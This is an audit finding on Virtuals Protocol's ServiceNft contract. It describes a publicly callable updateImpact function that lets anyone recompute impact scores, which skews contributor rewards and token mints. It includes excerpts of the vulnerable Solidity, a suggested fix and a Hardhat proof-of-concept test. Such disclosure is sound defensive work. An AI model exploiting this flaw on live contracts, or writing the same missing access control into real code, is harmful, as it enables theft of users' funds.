---
tags:
  - blockchain/evm
  - blockchain/evm/base
  - lang/solidity
  - sector/dex
  - sector/governance
  - sector/nft
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Virtuals]]"
auditors:
  - "[[TheDonH]]"
report: "https://code4rena.com/reports/2025-04-virtuals-protocol"
genome:
  - "[[single-function]]"
  - "[[direct-drain]]"
  - "[[reentrancy-guard]]"
  - "[[reward-accounting]]"
  - "[[treasury-multisig]]"
---
# [H-03] Public `ServiceNft::updateImpact` call leads to cascading issue

- id: 61824
- impact: HIGH
- protocol: [[Virtuals]] Protocol
- reporter: TheDonH (Code4rena)
- source: https://code4rena.com/reports/2025-04-virtuals-protocol

## Summary


This bug report addresses an issue in the ServiceNft contract of the Virtuals protocol. The updateImpact function in this contract is designed to be called via governance, but its visibility modifier is set to public, allowing anyone to call it with any virtualId/proposalId. This can lead to a cascading issue where users can update the impact to their own favor, causing a loss of funds for other users. This can also impact financial incentives, such as rewards and token transfers. It is recommended to change the visibility modifier of the updateImpact function to internal to prevent unfair manipulation. A proof of concept test case is provided for reference.

## Details



The [`ServiceNft::mint`](https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol# L58) is designed to be [called via governance](https://whitepaper.virtuals.io/about-virtuals-1/the-protocol/co-contribution-and-provenance/modular-consensus-framework):
```

Contribution Process: Contributors submit their proposals through our frontend, utilizing the modular consensus framework. Each proposal generates a contribution NFT regardless of acceptance, authenticating the submission's origin.

State Finality in ICV: Accepted contributions are minted as service NFTs on-chain and assigned to the appropriate Virtual address within the ICV, validating their integration into the Virtual ecosystem.
```

This function calls the [`ServiceNft::updateImpact`](https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol# L90) which sets up the impacts using the `datasetImpactWeight` variable:
```

    function updateImpact(uint256 virtualId, uint256 proposalId) public {

        // . . . Rest of the code . . .
        if (datasetId > 0) {
            _impacts[datasetId] = (rawImpact * datasetImpactWeight) / 10000;            <<@ -- // datasetImpactWeight is used
            _impacts[proposalId] = rawImpact - _impacts[datasetId];                     <<@ -- // Affects both `proposalId` and `datasetId`
            emit SetServiceScore(datasetId, _maturities[proposalId], _impacts[datasetId]);
            _maturities[datasetId] = _maturities[proposalId];
        }

        // . . . Rest of the code . . .
    }
```

However, as we can see the [`ServiceNft::updateImpact`](https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol# L90)’s visibility modifier is public, allowing anyone to call it with any `virtualId`/`proposalId`. So if the admin decides to call the [`ServiceNft::setDatasetImpactWeight`](https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol# L141), there would be a cascading issue where users would simply update the impact accordingly to their own favour.

There are financial incentives observed as well, described as follows:

1. The [`AgentRewardV2::_distributeContributorRewards`](https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV2.sol# L252) uses [`ServiceNft::getImpact`](https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol# L120) call for calculating rewards; hence, allowing to gain higher rewards or provide lesser rewards to the rest.
```

    function _distributeContributorRewards(
        uint256 amount,
        uint256 virtualId,
        RewardSettingsCheckpoints.RewardSettings memory settings
    ) private {
       // . . . Rest of the code . . .
        for (uint i = 0; i < services.length; i++) {
            serviceId = services[i];
            impact = serviceNftContract.getImpact(serviceId);           <<@ -- // Uses getImpact
            if (impact == 0) {
                continue;
            }

            ServiceReward storage serviceReward = _serviceRewards[serviceId];
            if (serviceReward.impact == 0) {
                serviceReward.impact = impact;
            }
            _rewardImpacts[reward.id][serviceNftContract.getCore(serviceId)] += impact;
        }

        // . . . Rest of the code . . .
    }
```

2. The [`Minter::mint`](https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/token/Minter.sol# L134) uses the [`ServiceNft::getImpact`](https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol# L120) call to transfer tokens; hence, leading to excess or lower funds being transferred.
```

    function mint(uint256 nftId) public noReentrant {

        // . . . Rest of the code . . .

        uint256 finalImpactMultiplier = _getImpactMultiplier(virtualId);
        uint256 datasetId = contribution.getDatasetId(nftId);
        uint256 impact = IServiceNft(serviceNft).getImpact(nftId);          <<@ -- // Uses getImpact
        if (impact > maxImpact) {
            impact = maxImpact;
        }
        uint256 amount = (impact * finalImpactMultiplier * 10 ** 18) / DENOM;
        uint256 dataAmount = datasetId > 0
            ? (IServiceNft(serviceNft).getImpact(datasetId) * finalImpactMultiplier * 10 ** 18) / DENOM
            : 0;

        // . . . Rest of the code . . .
    }
```

### Impact

1. Public [`ServiceNft::updateImpact`](https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol# L90) function allows changing impacts to anyone.
2. Cascading issue leads loss of funds via:

   * Higher / Lower rewards according to the `datasetImpactWeight` increase or decrease.
   * Higher / Lower mints as per the `datasetImpactWeight` change.

### Recommended mitigation steps

It is highly contextual as per what the protocol intends to do, it is suggested to not keep `updateImpact` as a public function as it would be unfair for other users:
```

-    function updateImpact(uint256 virtualId, uint256 proposalId) public {
+    function updateImpact(uint256 virtualId, uint256 proposalId) internal {
```

### Proof of Concept

The test case below was ran using a base mainnet fork, please add the same to the `hardhat.config.js` file.

The hardhat version wasn’t supporting the base mainnet fork, so it had to be upgraded:
```

    "hardhat": "^2.23.0",
```

Add the following values to the `.env` file (along with private keys:
```

### Genesis DAO settings
GENESIS_VOTING_DELAY=0
GENESIS_VOTING_PERIOD=900
GENESIS_PROPOSAL_THRESHOLD=0

### Virtual DAO settings
PROTOCOL_VOTING_DELAY=0
PROTOCOL_VOTING_PERIOD=900
PROTOCOL_PROPOSAL_THRESHOLD=1000000000000000000000000
PROTOCOL_QUORUM_NUMERATOR=1000

### Other settings
CHAIN_ID=84532
VIRTUAL_APPLICATION_THRESHOLD=50000000000000000000 # 50
VIRTUAL_APPLICATION_THRESHOLD_VIP=125000000000000000000 # 125 $V
MATURITY_DURATION=1000 # number of blocks until initial virtual staker can withdraw (1000 blocks = ~33 minutes)

### AgentToken settings
AGENT_TOKEN_SUPPLY=1000000000 # 1B supply
AGENT_TOKEN_LIMIT_TRX=100000 # 100k max token per txn
AGENT_TOKEN_LIMIT_WALLET=1000000 # 1M token per wallet
AGENT_TOKEN_LP_SUPPLY=1000000000 # 1B LP tokens
AGENT_TOKEN_LIMIT=1000000000
AGENT_TOKEN_VAULT_SUPPLY=0 #
BOT_PROTECTION=3600 # 1hr
TAX=100 # 3%
BONDING_TAX=1
SWAP_THRESHOLD=1 # 0.00001% of total supply
### VOTING_TOKEN=
TBA_REGISTRY=

### Reward settings
PARENT_SHARES=2000 # 20%
PROTOCOL_SHARES=1000 # 10%
CONTRIBUTOR_SHARES=5000 # 50%
STAKER_SHARES=9000 # 90%
REWARD_STAKE_THRESHOLD=2000000000000000000 # 2 eth
DATASET_SHARES=7000 # 70%

### TAX MANAGER
MIN_SWAP_THRESHOLD=100000000000000000 # 0.1
MAX_SWAP_THRESHOLD=1000000000000000000000 # 1000

UNISWAP_ROUTER=0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24
```

Create a file called `PoC.js` anad add the following test case inside the `/tests` folder and run `npx hardhat test --grep "Unfair updateImpact"`:
```

const { parseEther, toBeHex, formatEther } = require("ethers/utils");
const { expect } = require("chai");
const {
  loadFixture,
  mine,
  impersonateAccount,
  setBalance,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");

describe("AgentFactory", () => {
  const PROPOSAL_THRESHOLD = parseEther("50000"); // 50k
  const MATURITY_SCORE = toBeHex(2000, 32); // 20%
  const IP_SHARE = 1000; // 10%

  const genesisInput = {
    name: "Jessica",
    symbol: "JSC",
    tokenURI: "http://jessica",
    daoName: "Jessica DAO",
    cores: [0, 1, 2],
    tbaSalt:
      "0xa7647ac9429fdce477ebd9a95510385b756c757c26149e740abbab0ad1be2f16",
    tbaImplementation: process.env.TBA_IMPLEMENTATION || ethers.ZeroAddress,
    daoVotingPeriod: 600,
    daoThreshold: 1000000000000000000000n,
  };

  const getAccounts = async () => {
    const [deployer, ipVault, founder, poorMan, trader, treasury, randomAddr] = await ethers.getSigners();

    // Fund all accounts with ETH for gas (10 ETH each)
    const fundAccounts = [deployer, ipVault, founder, poorMan, trader, treasury];
    for (const account of fundAccounts) {
      await setBalance(account.address, parseEther("10"));
    }

    return { deployer, ipVault, founder, poorMan, trader, treasury, randomAddr };
  };

  async function deployBaseContracts() {
    const { deployer, ipVault, treasury } = await getAccounts();

    // Setting up environment variables if not present in the actual .env
    // This is for testing purposes only
    if (!process.env.TBA_IMPLEMENTATION) process.env.TBA_IMPLEMENTATION = ethers.ZeroAddress;
    if (!process.env.DATASET_SHARES) process.env.DATASET_SHARES = "1000"; // 10%
    if (!process.env.UNISWAP_ROUTER) process.env.UNISWAP_ROUTER = "0x8aEF2b5C33686F8621A17B9Aaff079E7d8D673f9"; // Base mainnet Uniswap router
    if (!process.env.AGENT_TOKEN_LIMIT) process.env.AGENT_TOKEN_LIMIT = parseEther("10000000").toString(); // 10M
    if (!process.env.AGENT_TOKEN_LP_SUPPLY) process.env.AGENT_TOKEN_LP_SUPPLY = parseEther("5000000").toString(); // 5M
    if (!process.env.AGENT_TOKEN_VAULT_SUPPLY) process.env.AGENT_TOKEN_VAULT_SUPPLY = parseEther("2000000").toString(); // 2M
    if (!process.env.BOT_PROTECTION) process.env.BOT_PROTECTION = "100"; // 1%
    if (!process.env.TAX) process.env.TAX = "500"; // 5%
    if (!process.env.SWAP_THRESHOLD) process.env.SWAP_THRESHOLD = parseEther("10").toString(); // 10 tokens

    console.log("Deploying VirtualToken...");
    const virtualToken = await ethers.deployContract(
      "VirtualToken",
      [PROPOSAL_THRESHOLD, deployer.address],
      {}
    );

    await virtualToken.waitForDeployment();
    console.log(`VirtualToken deployed at ${virtualToken.target}`);

    console.log("Deploying ERC6551Registry Registry");
    const tbaRegistry = await ethers.deployContract("ERC6551Registry");
    await tbaRegistry.waitForDeployment();
    console.log("Deployed ERC6551Registry Registry");

    console.log("Deploying AgentNftV2...");
    const AgentNft = await ethers.getContractFactory("AgentNftV2");
    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);
    console.log(`AgentNftV2 deployed at ${agentNft.target}`);

    console.log("Deploying ContributionNft...");
    const contribution = await upgrades.deployProxy(
      await ethers.getContractFactory("ContributionNft"),
      [agentNft.target],
      {}
    );
    console.log(`ContributionNft deployed at ${contribution.target}`);

    console.log("Deploying ServiceNft...");
    const service = await upgrades.deployProxy(
      await ethers.getContractFactory("ServiceNft"),
      [agentNft.target, contribution.target, process.env.DATASET_SHARES],
      {}
    );
    console.log(`ServiceNft deployed at ${service.target}`);

    await agentNft.setContributionService(contribution.target, service.target);
    console.log("Set contribution and service on AgentNft");

    // Implementation contracts
    console.log("Deploying AgentToken...");
    const agentToken = await ethers.deployContract("AgentToken");
    await agentToken.waitForDeployment();
    console.log(`AgentToken deployed at ${agentToken.target}`);

    console.log("Deploying AgentDAO...");
    const agentDAO = await ethers.deployContract("AgentDAO");
    await agentDAO.waitForDeployment();
    console.log(`AgentDAO deployed at ${agentDAO.target}`);

    console.log("Deploying AgentVeToken...");
    const agentVeToken = await ethers.deployContract("AgentVeToken");
    await agentVeToken.waitForDeployment();
    console.log(`AgentVeToken deployed at ${agentVeToken.target}`);

    console.log("Deploying AgentFactoryV2...");
    const agentFactory = await upgrades.deployProxy(
      await ethers.getContractFactory("AgentFactoryV2"),
      [
        agentToken.target,
        agentVeToken.target,
        agentDAO.target,
        tbaRegistry.target,
        virtualToken.target,
        agentNft.target,
        PROPOSAL_THRESHOLD,
        deployer.address,
      ]
    );
    await agentFactory.waitForDeployment();
    console.log(`AgentFactoryV2 deployed at ${agentFactory.target}`);

    await agentNft.grantRole(await agentNft.MINTER_ROLE(), agentFactory.target);
    console.log("Granted MINTER_ROLE to AgentFactory");

    console.log("Deploying Minter...");
    const minter = await upgrades.deployProxy(
      await ethers.getContractFactory("Minter"),
      [
        service.target,
        contribution.target,
        agentNft.target,
        1e12,
        20,
        ipVault.address,
        agentFactory.target,
        deployer.address,
        1e10,
      ]
    );
    await minter.waitForDeployment();
    console.log(`Minter deployed at ${minter.target}`);

    console.log("Setting parameters on AgentFactory...");
    await agentFactory.setMaturityDuration(86400 * 365 * 10); // 10years
    await agentFactory.setUniswapRouter(process.env.UNISWAP_ROUTER);
    await agentFactory.setTokenAdmin(deployer.address);

    await agentFactory.setTokenSupplyParams(
      process.env.AGENT_TOKEN_LIMIT,
      process.env.AGENT_TOKEN_LP_SUPPLY,
      process.env.AGENT_TOKEN_VAULT_SUPPLY,
      process.env.AGENT_TOKEN_LIMIT,
      process.env.AGENT_TOKEN_LIMIT,
      process.env.BOT_PROTECTION,
      minter.target
    );

    await agentFactory.setTokenTaxParams(
      process.env.TAX,
      process.env.TAX,
      process.env.SWAP_THRESHOLD,
      treasury.address
    );
    console.log("AgentFactory parameters set");

    return { virtualToken, agentFactory, agentNft, minter, tbaRegistry, service };
  }

  async function deployWithApplication() {
    const base = await deployBaseContracts();
    const { agentFactory, virtualToken, tbaRegistry } = base;
    const { founder } = await getAccounts();

    // Prepare tokens for proposal
    console.log("Minting VirtualToken for founder...");
    await virtualToken.mint(founder.address, PROPOSAL_THRESHOLD);
    await virtualToken
      .connect(founder)
      .approve(agentFactory.target, PROPOSAL_THRESHOLD);

console.log("Proposing agent...");
    const tx = await agentFactory
      .connect(founder)
      .proposeAgent(
        genesisInput.name,
        genesisInput.symbol,
        genesisInput.tokenURI,
        genesisInput.cores,
        genesisInput.tbaSalt,
        tbaRegistry.target,
        genesisInput.daoVotingPeriod,
        genesisInput.daoThreshold
      );

      await tx.wait();

    const filter = agentFactory.filters.NewApplication;
    const events = await agentFactory.queryFilter(filter, -1);
    const event = events[0];
    const { id } = event.args;
    console.log(`Agent application created with ID: ${id}`);

    return { applicationId: id, ...base };
  }

  async function deployWithAgent() {
    const base = await deployWithApplication();
    const { agentFactory, applicationId } = base;

    const { founder } = await getAccounts();
    console.log("Executing application...");
    await agentFactory
      .connect(founder)
      .executeApplication(applicationId, false);

    const factoryFilter = agentFactory.filters.NewPersona;
    const factoryEvents = await agentFactory.queryFilter(factoryFilter, -1);
    const factoryEvent = factoryEvents[0];

    const { virtualId, token, veToken, dao, tba, lp } = await factoryEvent.args;
    console.log(`Agent created with virtualId: ${virtualId}`);

    return {
      ...base,
      agent: {
        virtualId,
        token,
        veToken,
        dao,
        tba,
        lp,
      },
    };
  }

  before(async function () {
    // Increase timeout for all tests
    this.timeout(60000);
  });

it("Unfair updateImpact", async function () {

    const { agent, agentNft, virtualToken, service} = await loadFixture(
      deployWithAgent
    );
    const { trader, poorMan, founder, randomAddr, deployer } = await getAccounts();

    // Update the impact
    await service.connect(trader).updateImpact(1n, 1n);

    // Old - DATASET_SHARES=7000 # 70%
    expect(await service.datasetImpactWeight()).to.be.eq(7000n);

    // Change the datasetImpactWeight
    // Setting to 8000
    await service.connect(deployer).setDatasetImpactWeight(8000n);

    expect(await service.datasetImpactWeight()).to.be.eq(8000n);

    // Again updating impact should work
    await service.connect(trader).updateImpact(1n, 1n);

  });

});
```

**Virtuals marked as informative**

---
